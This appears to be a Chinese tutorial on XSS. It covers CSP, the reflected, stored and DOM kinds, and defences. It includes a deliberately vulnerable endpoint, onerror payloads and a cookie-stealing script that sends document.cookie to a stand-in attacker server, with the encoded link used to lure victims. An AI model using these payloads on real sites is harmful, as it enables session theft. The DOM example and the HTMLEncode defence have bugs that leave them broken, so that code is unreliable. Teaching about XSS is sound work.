## 简述

跨站脚本攻击(XSS)，英文全称 Cross Site Script，由于缩写和层叠样式表 CSS 重复，所以别名为 XSS。  
XSS 主要是黑客通过 HTML 插入恶意代码或脚本，控制浏览器用户的一种攻击方式。

## 浏览器安全措施

### CSP

CSP（内容安全策略），全名 Content-Security-Policy，是一种计算机安全标准，用以防止可信网站执行恶意代码内容而导致的跨站脚本攻击(xss)，点击劫持和其它代码注入攻击。如果网站没有设置 CSP 或者浏览器不支持，那么就会**默认使用同源策略**。

CSP 是仅执行白名单指定的域下的可执行脚本，减少或消除 XSS 攻击所依赖的载体。

#### CSP 在浏览器的支持

<a data-fancybox title="CSP浏览器支持" href="/计算机通用/CSP浏览器支持.png">![CSP浏览器支持](/计算机通用/CSP浏览器支持.png)</a>

具体详情:[https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP "MDN/CSP")  
**使用**
设置 HTTP 头部来指定策略或者在 html 的 meta 标签中进行设置，每个策略描述一个特定的类型资源及其生效的范围，可以使用 default-src 指令或者 script-src 指令等等

**1. meta 标签**

```md
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```

**2. 指定策略**

```md
Content-Security-Policy: policy
```

**3. 不强制，仅做出报告，用以测试**

```md
Content-Security-Policy-Report-Only: policy
```

```md
只允许加载同一个源下的资源（不包括子域名）
Content-Security-Policy: default-src 'self'
...还有更多的策略，这里不再一一叙述
```

#### 简单实验

开启两个不同端口的本地 node 服务，暂且就以 3001 和 3002 端口为例吧
3001 返回一个静态 html 页面, 使用 script 去加载 3002 下的一个 js 静态资源

```html
<!-- index.html -->
...
<script src="http://localhost:3002/text.js"></script>
...
```

```js
// 服务
app.get("/", (req, res) => {
  const _html = fs.readFileSync(
    path.resolve(__dirname, "./index.html"),
    "utf-8"
  );
  res.setHeader("Content-Type", "text/html");
  res.send(_html);
});
```

首先不添加 CSP，那么 script 的 src 是可以跨域的，所以结果是可以加载的
<a data-fancybox title="不添加CSP" href="/计算机通用/设置CSP_1.png">![不添加CSP](/计算机通用/设置CSP_1.png)</a>

接着添加 CSP 策略，只允许加载同一个源下的资源（不包括子域名，同源本身也要求子域名一致），不在指定域下的资源就被禁止加载了

```js
res.setHeader("Content-Security-Policy", "default-src 'self'");
```

<a data-fancybox title="添加CSP" href="/计算机通用/设置CSP_2.png">![添加CSP](/计算机通用/设置CSP_2.png)</a>

### X-XSS-Protection

X-XSS-Protection 不是一个标准，所以支持的情况也不容乐观，甚至 Chrome 在 77 版本后也不在支持
<a data-fancybox title="X-XSS-Protection浏览器支持" href="/计算机通用/X-XSS-Protection浏览器支持.png">![X-XSS-Protection浏览器支持](/计算机通用/X-XSS-Protection浏览器支持.png)</a>

## 危害

- 获取页面数据，偷取网站任意数据
- 获取 Cookies，偷取重要用户信息，甚至获取登录信息，进行更过的恶意操作
- 劫持前端逻辑，破坏网站
- 发送请求给其他服务器
- ...等等

## 分类

#### 反射性 XSS

简述：就是把用户的输入的数据让浏览器执行，一般是攻击者将插入恶意代码的链接发送给浏览器用户，诱导用户点击链接，实施攻击。

场景：一般是修改 URL 或者表单输入

实例：首先代码必须被注入到 html，那么他才能被执行，所以攻击者会关注一些用户交互的地方，比如搜索框，搜索的内容会在 URL 的 search 值上，且能返回到页面的内容，比如作为页面上提示的关键字，显示在页面上，所以攻击者只需将搜索的内容换成自己的恶意代码，恶意代码就会被注入 HTML，然后被执行

编写一个服务，返回一个静态 html 文件，内容包含一个表单，然后编写一个接口，接受表单内容并返回到页面上

```html
<form action="/search" method="GET">
  <input type="text" name="q" />
  <input type="submit" value="提交" />
</form>
```

```js
app.get("/search", (req, res) => {
  let query = req.query.q;
  res.set("X-XSS-Protection", 0); //关闭浏览器的默认阻止XSS行为
  res.writeHead(200, { "Content-Type": "text/html;charset=UTF8" });
  res.write(query);
  res.end();
});
```

如果在表单中输入

```js
<script>alert('xss')</script>
```

<a data-fancybox title="xss_1" href="/计算机通用/xss_1.png">![xss_1](/计算机通用/xss_1.png)</a>
那么页面就会执行表单内的数据，成功实施了 XSS 攻击
<a data-fancybox title="xss_2" href="/计算机通用/xss_2.png">![xss_2](/计算机通用/xss_2.png)</a>
然后就可以吧这个链接发给用户，用户点击了这个链接，就被被实施 XSS 攻击

#### 存储性 XSS

简述：和反射性相比，存储性往往危害更大，其是将恶意代码提交到服务器，存储在数据库中，具有很强的稳定性，用户只要访问到了这条存储的数据就会被 XSS 攻击。

场景：一般出现在保存的文章和一些论坛网站中

和反射性不同的是其不需要用户主动点击某个链接，它会在用户进入带有 XSS 攻击恶意代码的某篇文章或者评论，直接对用户进行 XSS 攻击。

#### DOM Based XSS

简述：该攻击主要是利用了 DOM 节点渲染机制来实施 XSS 攻击

场景：如使用 innerHTML 等 API，或者添加表单的 onclick，onerror 事件等

简单实现：

如：
我为文档添加一个 img 的标签，并且地址是错误的，那么他就会去执行 onerror 事件

```html
<img src="aaa" onerror="alert(123456789)" />
```

或者通过 innerHTML 直接对原 DOM 进行修改

```html
<div id="t"></div>
<input type="button" onclick="text()" />
```

```js
function test() {
  var str = document.getElementById("text").value;
  document.getElementById("t").innerHTML = "";
}
```

## 简单实现恶意代码攻击

这里以反射性为例，本质都一样，先写一个接口，接受到用户的 cookie 信息，这里如果想要存储，可以写入文件的形式

```js
app.get("/getCookie", (req, res) => {
  console.log(req.query.name);
});
```

然后在写一个 js 文件，那么为页面添加一个元素，该元素需要具有 src 等属性跨域加载资源的能力，这里使用的是 img。为什么不直接加载接口？因为 html 中不好拼接字符串，只能使用 js 拼接

```js
// test.js
var img = document.createElement("img");
img.src = "http://localhost:3002/getCookie?name=" + document.cookie;
document.body.appendChild(img);
```

然后在表单输入

```html
<script src="http://localhost:3002/test.js"></script>
```

攻击者就可以拿到用户下的 cookie 了，将生成的链接诱导别的用户，就会形成大规模的 XSS 攻击

```js
http://localhost:3001/?name=%3Cscript+src%3D%22http%3A%2F%2Flocalhost%3A3002%2Ftest.js%22%3E%3C%2Fscript%3E
```

## XSS 防御

### HttpOnly

为了防止 XSS 攻击获取用户的 cookie 信息，可以直接通过服务端设置表头 Set-Cookie 设置 httpOnly 来禁止前端访问到 cookie，可以对每一项进行添加 httpOnly 属性。但是 HttpOnly 并不等于解决了 XSS 问题，它只是对 cookie 进行了保护

```js
res.setHeader("Set-Cookie", ["mycookie1=value1;HttpOnly", "mycookie2=value2"]);
```

这样对应的 cookie 项在前端就访问不到了

<a data-fancybox title="HttpOnly后的cookie" href="/计算机通用/HttpOnly后的cookie.png">![HttpOnly后的cookie](/计算机通用/HttpOnly后的cookie.png)</a>

### 输入检查

主要是通过 XSS Filter 将特殊字符进行过滤，客户端和服务端需要做同样的过滤，来提高安全性，客户端的输入检查主要是为了减小服务器的压力，而服务器的才是最后的“城墙”。比如禁止输入&，#等特殊字符，或者对应的表单还匹配正确的规则，如手机号输入只能是数字，并且只能输入 11 位，只能以 13，或 15 开头等

### 输出检查

输出检查是通过编码和转义的方式改变代码来防御 XSS 攻击的。

#### 1.对于 HTML 代码进行进行编码，将字符串转化为 HTMLEntities，遵守 ISO-8859-1 标准

#### 简单实现

> 更多更完善的 HTMLEncode 请参考网上资料

```js
function HTMLEncode(str) {
  let encoded = "";
  for (let i = 0; i < str.length; i++) {
    let charAtItem = str.charAt(i);
    encoded += encode(charAtItem);
  }
  return encoded;

  function encode(charAtItem) {
    var code = charAtItem.charCodeAt(0);
    switch (code) {
      case 34:
        return "&quot;";
        break; //"
      case 38:
        return "&amp;";
        break; //&
      case 39:
        return "&#x27;";
        break; //'
      case 47:
        return "&#x2F;";
        break; // /
      case 60:
        return "&lt;";
        break; //<
      case 62:
        return "&gt;";
        break; //>
      default:
        return charCode;
        break;
    }
  }
}



```

#### 2.对于 JavaScript 主要是使用\将特殊字符进行转义



